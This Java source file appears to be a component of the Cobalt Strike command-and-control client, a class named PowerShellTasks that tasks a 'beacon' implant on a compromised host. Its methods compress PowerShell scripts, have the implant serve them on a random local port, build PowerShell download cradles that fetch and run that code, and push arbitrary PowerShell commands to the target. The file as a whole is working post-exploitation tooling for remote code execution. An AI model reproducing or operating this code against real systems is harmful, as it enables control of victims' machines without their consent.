package beacon;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.CommonUtils;
import common.PowerShellUtils;

public class PowerShellTasks {
    protected AggressorClient client;

    protected String bid;

    public PowerShellTasks(AggressorClient aggressorClient, String string) {
        this.client = aggressorClient;
        this.bid = string;
    }

    public String getScriptCradle(String string) {
        String str = (new PowerShellUtils(this.client)).PowerShellCompress(CommonUtils.toBytes(string));
        int i = CommonUtils.randomPortAbove1024();
        CommandBuilder commandBuilder = new CommandBuilder();
        commandBuilder.setCommand(59);
        commandBuilder.addShort(i);
        commandBuilder.addString(str);
        byte[] arrby = commandBuilder.build();
        this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, arrby));
        return (new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + i + "/");
    }

    public String getImportCradle() {
        if (!DataUtils.hasImportedPowerShell(this.client.getData(), this.bid))
            return "";
        int i = CommonUtils.randomPortAbove1024();
        CommandBuilder commandBuilder = new CommandBuilder();
        commandBuilder.setCommand(79);
        commandBuilder.addShort(i);
        this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, commandBuilder.build()));
        return (new PowerShellUtils(this.client)).PowerShellDownloadCradle("http://127.0.0.1:" + i + "/") + "; ";
    }

    public void runCommand(String string) {
        String str = (new PowerShellUtils(this.client)).format(string, false);
        CommandBuilder commandBuilder = new CommandBuilder();
        commandBuilder.setCommand(78);
        commandBuilder.addLengthAndString("");
        commandBuilder.addLengthAndString(str);
        commandBuilder.addShort(1);
        byte[] arrby = commandBuilder.build();
        this.client.getConnection().call("beacons.task", CommonUtils.args(this.bid, arrby));
    }
}
